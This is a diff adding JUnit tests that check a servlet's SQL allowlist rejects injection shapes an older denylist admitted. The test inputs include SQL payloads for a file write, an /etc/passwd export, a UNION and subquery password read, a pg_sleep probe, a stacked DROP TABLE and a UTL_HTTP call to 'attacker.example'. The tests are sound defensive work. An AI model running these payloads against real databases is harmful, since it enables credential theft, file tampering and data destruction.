@@ -85,6 +85,46 @@ public class DatabaseConnectorServletSqliTest {
         assertTrue(DatabaseConnectorServlet.isSafeSelectLimit("SELECT * FROM ? LIMIT 1;"));
     }
 
+    /**
+     * G-26.13-4 (Dan Svanstedt PR #53 review, BLOCKING #1, D-07 falsifiability): the prior
+     * denylist admitted these single-statement side effects and injection shapes because none of
+     * them carry a semicolon, a comment token, or a placeholder count other than one. Each was
+     * observed RED (assertFalse failing, isSafeSelectLimit returning true) against the pre-swap
+     * denylist code before the allowlist grammar replaced it. A seventh, classic stacked-statement
+     * payload is included as a regression guard that was already green-on-both.
+     */
+    @Test
+    public void isSafeSelectLimit_rejectsSingleStatementSideEffectsAndInjectionShapesTheOldDenylistAdmitted() {
+        // MySQL file write (CISA-named).
+        assertFalse(DatabaseConnectorServlet.isSafeSelectLimit("SELECT 'x' INTO OUTFILE '/tmp/p' FROM ?"));
+        // Postgres large-object export/import (CISA-named).
+        assertFalse(DatabaseConnectorServlet.isSafeSelectLimit("SELECT lo_export(lo_import('/etc/passwd'), '/tmp/out') FROM ?"));
+        // Oracle SSRF (CISA-named).
+        assertFalse(DatabaseConnectorServlet.isSafeSelectLimit("SELECT UTL_HTTP.REQUEST('http://attacker.example/') FROM ?"));
+        // Blind/time-based probe (CISA-named, the prior accepted residual).
+        assertFalse(DatabaseConnectorServlet.isSafeSelectLimit("SELECT * FROM ? WHERE pg_sleep(5) IS NULL"));
+        // UNION credential read.
+        assertFalse(DatabaseConnectorServlet.isSafeSelectLimit("SELECT * FROM ? UNION SELECT username, password FROM users"));
+        // Scalar-subquery exfil.
+        assertFalse(DatabaseConnectorServlet.isSafeSelectLimit("SELECT (SELECT password FROM users) FROM ?"));
+        // Classic stacked statement - already rejected on both the old denylist and the new
+        // grammar (regression guard, green-on-both).
+        assertFalse(DatabaseConnectorServlet.isSafeSelectLimit("SELECT * FROM ?; DROP TABLE audit"));
+    }
+
+    /**
+     * G-26.13-4: the four shipped safe limiting shapes the allowlist grammar must continue to
+     * admit (green-on-both - the old denylist also admitted these; the grammar must not break a
+     * legitimate shipped shape).
+     */
+    @Test
+    public void isSafeSelectLimit_acceptsShippedSafeLimitingShapes() {
+        assertTrue(DatabaseConnectorServlet.isSafeSelectLimit("SELECT * FROM ? LIMIT 1"));
+        assertTrue(DatabaseConnectorServlet.isSafeSelectLimit("SELECT TOP 1 * FROM ?"));
+        assertTrue(DatabaseConnectorServlet.isSafeSelectLimit("SELECT * FROM ? WHERE ROWNUM <= 1"));
+        assertTrue(DatabaseConnectorServlet.isSafeSelectLimit("SELECT * FROM ? FETCH FIRST 1 ROWS ONLY"));
+    }
+
     // -----------------------------------------------------------------------------------------
     // retrieveColumns() interaction assertions - proves the injection is never executed, not
     // merely that a mock happens to return a plausible-looking result
